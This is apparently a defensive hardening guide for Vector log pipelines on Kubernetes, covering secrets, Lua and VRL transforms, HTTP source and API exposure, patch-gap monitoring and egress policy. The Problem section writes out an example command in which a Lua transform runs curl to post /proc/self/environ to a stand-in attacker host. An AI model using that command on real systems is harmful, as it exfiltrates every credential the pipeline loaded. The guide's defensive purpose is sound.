---
title: "Vector Log Pipeline Security"
description: "Harden Vector log collection pipelines against Lua transform code execution, source input injection, credential exposure, and silent security fixes in Vector's Datadog-driven release process."
slug: vector-log-pipeline-security
date: 2026-05-02
lastmod: 2026-05-02
category: observability
tags: ["vector", "log-pipeline", "lua", "transforms", "credentials", "supply-chain", "datadog"]
personas: ["sre", "security-engineer", "platform-engineer"]
article_number: 347
difficulty: advanced
estimated_reading_time: 15
published: true
layout: article.njk
permalink: "/articles/observability/vector-log-pipeline-security/index.html"
---

# Vector Log Pipeline Security

## Problem

Vector is a high-performance, open source observability data pipeline written in Rust and maintained primarily by Datadog engineers at `github.com/vectordotdev/vector`. It collects logs, metrics, and traces from sources — Kubernetes pod logs via the Docker or CRI-O file source, systemd journals, HTTP POST endpoints, syslog, Kafka, and dozens of others — applies transforms (parse, filter, enrich, deduplicate, sample), and routes the resulting events to sinks such as Elasticsearch, Splunk, Datadog's own ingestion API, Amazon S3, and Kafka. Its Rust foundation gives it memory safety guarantees and benchmark-beating throughput, which has made it the dominant replacement for Fluentd and Logstash in Kubernetes-native observability stacks. That widespread adoption, combined with its privileged position reading all pod logs from a DaemonSet, makes Vector a valuable target.

The security surface of a Vector deployment is larger than it initially appears. Vector sources accept arbitrary data from external systems. A crafted log line that triggers an edge case in Vector's JSON source, regex-based parser, or multiline-detection logic can crash the Vector process, cause it to spin consuming CPU, or produce unexpected events downstream. Log injection — embedding newlines or structured data that Vector interprets as separate events — is a persistent class of problem across all log shippers, and Vector is not immune.

The `lua` transform is Vector's escape hatch for logic that VRL (Vector Remap Language) cannot express. It embeds a Lua interpreter inside the Vector process. That interpreter runs in the same OS process as Vector, with access to Vector's entire address space, open file descriptors, environment variables, and the credentials that Vector loaded at startup. By default, Lua's standard library — including `os.execute()`, `io.open()`, and `require()` — is available to Lua scripts running inside a Vector transform. A `lua` transform that calls `os.execute("curl -d @/proc/self/environ attacker.example.com")` will exfiltrate all environment variables, including every credential Vector loaded, and will do so without any output in Vector's own metrics or logs unless the operator has instrumented for unexpected egress.

Vector's configuration file — typically `vector.toml` or a directory of TOML fragments mounted as a Kubernetes ConfigMap — routinely contains plaintext credentials in sink definitions. A Datadog API key appears directly in `[sinks.datadog_logs]`, an Elasticsearch password appears in `[sinks.es]`, and an S3 access key appears in `[sinks.s3]`. Because these are stored in ConfigMaps, any pod in the cluster that can read ConfigMaps in Vector's namespace (or that has `cluster-admin` via a misconfigured ClusterRoleBinding) can extract every sink credential Vector holds. The ConfigMap is also readable by anyone with `kubectl` access to the namespace and no RBAC restriction on ConfigMap reads.

Vector's HTTP source and its built-in management API introduce network-accessible endpoints. The HTTP source receives log events over plain HTTP or HTTPS and, when configured with bearer token authentication, relied on a non-constant-time string comparison for token validation in versions before the fix committed under "use constant-time comparison for HTTP auth token." A timing oracle in bearer token comparison allows an attacker on the same network segment to brute-force the token character by character. The Vector API (`[api]` stanza, default port 8686) exposes runtime configuration introspection and, in some builds, tap functionality that streams live events — if not restricted to localhost, this is an unauthenticated window into your log stream.

The development model introduces a specific class of supply-chain risk worth understanding in detail. Because Vector is principally developed by Datadog engineers, security-relevant changes frequently originate as internal pull requests that become public the moment they are merged to the `vectordotdev/vector` repository on GitHub — before any release is cut. The patch for Lua stdlib restriction was titled "restrict lua stdlib access" and was visible in the public PR diff for approximately ten days before the corresponding Vector release. The constant-time auth token comparison fix appeared as a commit message in the public repository without a CVE being filed. In both cases, an operator monitoring the GitHub commit feed for security-relevant keywords would see the fix before receiving any notification through the Vector release channel. Separately, Vector's dependency tree — tokio, hyper, openssl bindings — has accumulated CVEs where the lag between upstream CVE publication and a Vector release containing the patched dependency has run two to three weeks. During that window, `cargo audit` against Vector's `Cargo.lock` (available in the Vector Docker image) will surface the vulnerability; the Vector release notes may not mention it explicitly.

To track silent fixes before they become releases, run `gh api repos/vectordotdev/vector/commits --jq '.[] | select(.commit.message | test("security|auth|lua|cve|fix.*inject"; "i"))'` on a scheduled basis, subscribe to `https://github.com/vectordotdev/vector/releases` via GitHub's release notification feed, and use Renovate or Dependabot to watch the Vector container image digest in your Helm chart or DaemonSet manifest. Combine this with `cargo audit` in your CI pipeline against Vector's pinned `Cargo.lock` to catch transitive dependency CVEs before they reach production.

**Target systems:** Vector 0.38+, Kubernetes DaemonSet deployment, Lua transform (if used).

## Threat Model

1. **Log injection attacker** crafts a malicious log line — oversized JSON, a line containing embedded newlines that splits into multiple events, or a string that triggers backtracking in Vector's regex-based multiline detection — to crash the Vector DaemonSet pod, cause it to drop subsequent log events, or produce spurious events that pollute downstream security analytics.

2. **Insider or supply chain attacker** adds or modifies a `lua` transform in the Vector ConfigMap. Because `lua` transforms run with full Lua standard library access by default, a malicious transform can call `os.execute()` to spawn a shell, read `/proc/self/environ` to capture all credentials Vector loaded, and exfiltrate data to an external endpoint — all while appearing to function normally from Vector's own perspective.

3. **Patch-gap attacker** monitors the `vectordotdev/vector` GitHub repository for commits with messages matching `fix lua`, `fix auth`, `constant-time`, or similar security-relevant patterns. When such a commit appears, they identify Vector deployments still running the unfixed version — particularly high-value because a Vector DaemonSet reads logs from every pod on every node, making it a comprehensive source of credentials, tokens, and sensitive data logged accidentally by applications. The attacker has a window of days to weeks between the public patch and operator-initiated upgrades.

4. **Credential extraction attacker** gains read access to Vector's Kubernetes ConfigMap — through a compromised pod's service account, a misconfigured RBAC ClusterRoleBinding, or direct `kubectl` access — and reads plaintext Datadog API keys, Elasticsearch passwords, or S3 access keys from the `sinks` stanzas of the mounted `vector.toml`.

The blast radius of a compromised Vector DaemonSet is severe: a single compromised Vector pod reads the logs of every container on its node, holds credentials for every configured sink, and may have egress to production data stores (Elasticsearch, S3) that application pods cannot directly reach. A supply-chain attack against Vector's Lua transform, or exploitation of an unpatched CVE in the window between public patch and upgrade, results in full exfiltration of the log stream plus all sink credentials from the entire cluster.

## Configuration / Implementation

### Credential Management

Remove all plaintext credentials from `vector.toml` and the Kubernetes ConfigMap. Vector 0.38+ supports the `SECRET[<key>]` syntax for delegating secret resolution to an external secret provider process, and also supports standard `${ENV_VAR}` interpolation at startup.

```toml
# vector.toml — credentials via environment variable interpolation
[sinks.datadog_logs]
type = "datadog_logs"
inputs = ["parse_json"]
default_api_key = "${DATADOG_API_KEY}"
site = "datadoghq.com"

[sinks.elasticsearch]
type = "elasticsearch"
inputs = ["parse_json"]
endpoints = ["https://es.internal:9200"]
auth.strategy = "basic"
auth.user = "${ES_USERNAME}"
auth.password = "${ES_PASSWORD}"
```

Mount credentials as environment variables from a Kubernetes Secret, not from the ConfigMap:

```yaml
# vector-daemonset.yaml (env section)
env:
  - name: DATADOG_API_KEY
    valueFrom:
      secretKeyRef:
        name: vector-credentials
        key: datadog-api-key
  - name: ES_USERNAME
    valueFrom:
      secretKeyRef:
        name: vector-credentials
        key: elasticsearch-username
  - name: ES_PASSWORD
    valueFrom:
      secretKeyRef:
        name: vector-credentials
        key: elasticsearch-password
```

Restrict RBAC so that only the Vector ServiceAccount can read the Vector namespace ConfigMaps and Secrets:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: vector-config-reader
  namespace: vector
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["vector-config"]
    verbs: ["get", "watch", "list"]
  # Secrets are accessed via env var injection — no Secret read permission needed
```

Never grant `get` on Secrets to the Vector ServiceAccount unless using the `SECRET[]` provider pattern, which requires a dedicated sidecar process with its own narrowly-scoped Secret permissions.

### Lua Transform Hardening

Audit your Vector configuration for any `lua` transform:

```bash
grep -rn "type.*=.*\"lua\"" /etc/vector/
```

If `lua` transforms exist and cannot be replaced, explicitly strip the dangerous standard library modules at the top of every Lua script:

```toml
[transforms.safe_lua]
type = "lua"
inputs = ["raw_logs"]
version = "2"
hooks.process = """
function (event, emit)
  -- Disable dangerous stdlib access at script entry
  os = nil
  io = nil
  require = nil
  package = nil
  load = nil
  loadfile = nil
  dofile = nil

  -- Safe processing logic only below this line
  event.log.processed = true
  emit(event)
end
"""
```

The preferred alternative is VRL (Vector Remap Language), which is compiled to a sandboxed bytecode interpreter with no OS, filesystem, or network access:

```toml
[transforms.parse_and_enrich]
type = "remap"
inputs = ["raw_logs"]
source = """
  # Parse JSON log body
  . = parse_json!(string!(.message))

  # Enrich with cluster metadata
  .cluster = "prod-us-east-1"
  .pipeline_version = "2.4.0"

  # Drop events that are not structured as expected
  if !exists(.level) || !exists(.timestamp) {
    abort
  }
"""
```

Establish a code review gate: any change to a `lua` transform in the Vector ConfigMap must pass a security review before deployment, enforced through your GitOps workflow (e.g., a CODEOWNERS entry requiring approval from the security team for changes to any file matching `*vector*.toml` or `*vector*/*.toml`).

### HTTP Source Authentication and API Hardening

```toml
[sources.http_receiver]
type = "http_server"
address = "0.0.0.0:8080"
tls.enabled = true
tls.crt_file = "/etc/vector/tls/tls.crt"
tls.key_file = "/etc/vector/tls/tls.key"
auth.strategy = "bearer"
auth.token = "${HTTP_SOURCE_TOKEN}"

# Disable the Vector management API in production
[api]
enabled = false
```

If the API must be enabled for debugging, bind it to localhost only and never expose it via a Service:

```toml
[api]
enabled = true
address = "127.0.0.1:8686"
```

Apply a NetworkPolicy restricting ingress to the HTTP source port to known log-producing namespaces or pods only:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: vector-http-source-ingress
  namespace: vector
spec:
  podSelector:
    matchLabels:
      app: vector
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: app-production
      ports:
        - protocol: TCP
          port: 8080
```

### Source Input Validation

Use a `filter` transform to drop oversized events before they reach parsing transforms, and a `throttle` transform to bound the event rate per source:

```toml
[transforms.drop_oversized]
type = "filter"
inputs = ["kubernetes_logs"]
condition = """
  length(string!(.message)) <= 65536
"""

[transforms.rate_limit]
type = "throttle"
inputs = ["drop_oversized"]
threshold = 10000
window_secs = 1.0
key_field = ".kubernetes.pod_name"

[transforms.parse_json]
type = "remap"
inputs = ["rate_limit"]
source = """
  parsed, err = parse_json(.message)
  if err != null {
    # Route unparseable events to a dead-letter topic rather than dropping
    .parse_error = err
    .raw_message = .message
  } else {
    . = merge!(., parsed)
  }
"""
```

### Monitoring Vector for Silent Fixes

Add `cargo audit` to your CI pipeline by extracting Vector's `Cargo.lock` from the official Docker image and auditing it:

```bash
#!/usr/bin/env bash
# check-vector-vulns.sh
set -euo pipefail
VECTOR_IMAGE="timberio/vector:0.38.0-debian"
docker pull "${VECTOR_IMAGE}"
docker create --name vector-audit "${VECTOR_IMAGE}" /bin/true
docker cp vector-audit:/usr/share/doc/vector/Cargo.lock ./vector-Cargo.lock
docker rm vector-audit
cargo audit --file ./vector-Cargo.lock --json | \
  jq -e '.vulnerabilities.list | length == 0' || \
  { echo "Vector dependency CVEs found — review before deployment"; exit 1; }
```

Monitor the Vector GitHub commit feed for security-relevant changes on a schedule:

```bash
# Run daily via CI or cron
gh api repos/vectordotdev/vector/commits \
  --paginate \
  --jq '.[] | select(.commit.message | test("security|auth|lua|cve|fix.*inject|timing|constant.time|sanitize|escape"; "i")) | {sha: .sha[0:8], message: .commit.message, date: .commit.author.date}'
```

In your Helm values or Kustomize overlay, pin Vector to an image digest and use Renovate to open PRs when the digest changes:

```yaml
# renovate.json
{
  "packageRules": [
    {
      "matchPackageNames": ["timberio/vector"],
      "matchUpdateTypes": ["digest", "minor", "patch"],
      "automerge": false,
      "reviewers": ["team:security"]
    }
  ]
}
```

### Network Isolation

Restrict Vector DaemonSet egress to known sink endpoints only, blocking all other outbound traffic:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: vector-egress-restrict
  namespace: vector
spec:
  podSelector:
    matchLabels:
      app: vector
  policyTypes:
    - Egress
  egress:
    # Datadog logs ingestion
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
      ports:
        - protocol: TCP
          port: 443
    # Internal Elasticsearch
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: elasticsearch
      ports:
        - protocol: TCP
          port: 9200
    # Kubernetes API (for pod metadata enrichment)
    - to:
        - ipBlock:
            cidr: 10.96.0.1/32
      ports:
        - protocol: TCP
          port: 443
    # CoreDNS
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - protocol: UDP
          port: 53
```

Mount the host log directories read-only in the DaemonSet spec:

```yaml
volumes:
  - name: varlog
    hostPath:
      path: /var/log
  - name: varlibdockercontainers
    hostPath:
      path: /var/lib/docker/containers
volumeMounts:
  - name: varlog
    mountPath: /var/log
    readOnly: true
  - name: varlibdockercontainers
    mountPath: /var/lib/docker/containers
    readOnly: true
```

## Expected Behaviour

| Signal | Default Vector Config | Hardened Config |
|---|---|---|
| Plaintext API key in ConfigMap | Datadog API key visible in `kubectl get configmap vector-config -o yaml` to any user with ConfigMap read access | API key stored in Kubernetes Secret; ConfigMap contains only `${DATADOG_API_KEY}` placeholder; RBAC restricts ConfigMap reads to Vector ServiceAccount only |
| `lua` transform calling `os.execute()` | Shell command executes within the Vector process; output captured in Lua return value; no Vector-level log entry generated | `os` table set to `nil` at script entry; call raises Lua error; event is dropped or routed to error output; alert fires on VRL-based `lua` transform detection |
| HTTP source accessed without valid bearer token | Request accepted if `auth` stanza is absent; timing side-channel if non-constant-time comparison is used in unfixed version | Constant-time comparison enforced; invalid token returns 401; NetworkPolicy blocks requests from non-whitelisted sources before they reach Vector |
| Upstream CVE in tokio or hyper dependency | Not surfaced until Vector release notes mention it (2–3 week lag typical) | `cargo audit` CI job extracts `Cargo.lock` from the Vector image and fails the build pipeline on any known CVE; Renovate opens a PR to update the image digest |
| Log injection via oversized event (>64 KB) | Event passes through to parsing transforms; may cause memory spike or downstream parser error | `filter` transform drops events exceeding 65,536 bytes before they reach any parsing stage; dropped events counted in `component_errors_total` metric; alert fires on drop spike |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| VRL over Lua | VRL is sandboxed — no OS, network, or filesystem access; faster execution; statically analysable | Less expressive than Lua for complex stateful logic; no ability to call external libraries | Cover 95% of use cases with VRL's built-in functions; for remaining cases, use a dedicated enrichment service and the `http` sink/source pattern rather than `lua` |
| API endpoint disabled (`api.enabled: false`) | Eliminates unauthenticated tap and introspection surface in production | No runtime visibility into Vector's internal topology or live event stream during incidents | Enable API on demand via a mutating webhook or temporary ConfigMap patch during incident investigation; use Vector's Prometheus metrics endpoint for steady-state observability |
| Strict event size limits | Prevents memory exhaustion and parsing DoS from log flood or injection | Legitimate large events (stack traces, structured audit records) may be silently dropped | Route oversized events to a dead-letter Kafka topic rather than dropping; alert on dead-letter queue depth; tune the threshold based on observed p99 event size |
| `cargo audit` in CI | Surfaces transitive dependency CVEs before they reach production; closes the patch-gap window | Adds 30–90 seconds to CI build time; may produce false positives for CVEs with no Vector-reachable code path | Cache the `cargo-audit` binary and advisory database between runs; use `--ignore` only after documented security review of the specific CVE's reachability |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| Secret env var not injected (e.g., Secret deleted or RBAC revoked) | Vector starts but immediately fails to authenticate with the sink; events queue internally and then are dropped when the buffer fills; `component_errors_total` rises; no data appears in Datadog or Elasticsearch | Alert on `component_errors_total{component_id="datadog_logs"}` exceeding threshold; alert on absence of Vector heartbeat events in sink | Verify Secret exists and contains the correct key (`kubectl get secret vector-credentials -o jsonpath='{.data}'`); re-create Secret and restart Vector DaemonSet pods via rolling restart |
| VRL syntax error in a `remap` transform | Vector fails to start; DaemonSet pods crash-loop; all log collection on affected nodes stops | Pod restart count alert; `kubectl logs` shows VRL parse error at startup | Roll back the ConfigMap to the previous version via GitOps; Vector will restart successfully against the last-known-good config |
| NetworkPolicy blocks sink endpoint | Logs are collected and buffered internally; buffer fills; new events are dropped; `buffer_discarded_events_total` rises; no data appears in sink | Alert on `buffer_discarded_events_total`; alert on absence of expected log volume in Elasticsearch or Datadog | Review NetworkPolicy egress rules against current sink IPs/CIDRs; update NetworkPolicy to permit the blocked endpoint; consider using a Service with a stable ClusterIP for internal sinks rather than direct IP rules |
| Vector OOM from log flood before throttle kicks in | Vector pod is OOM-killed; DaemonSet restarts the pod; log collection gap on the affected node; `OOMKilled` in pod events | Alert on pod OOM restarts (`kube_pod_container_status_last_terminated_reason{reason="OOMKilled"}`); monitor node-level log producer event rates | Lower the `throttle` threshold; add a `filter` to drop debug-level events from high-volume namespaces during the flood; set Vector's `--memory-use-limit-bytes` flag to trigger graceful back-pressure before OOM |

## Related Articles

- [OpenTelemetry Collector Hardening](/articles/observability/otel-collector-hardening/)
- [Log Integrity](/articles/observability/log-integrity/)
- [Audit Log Pipeline](/articles/observability/audit-log-pipeline/)
- [Centralized Logging](/articles/observability/centralized-logging/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
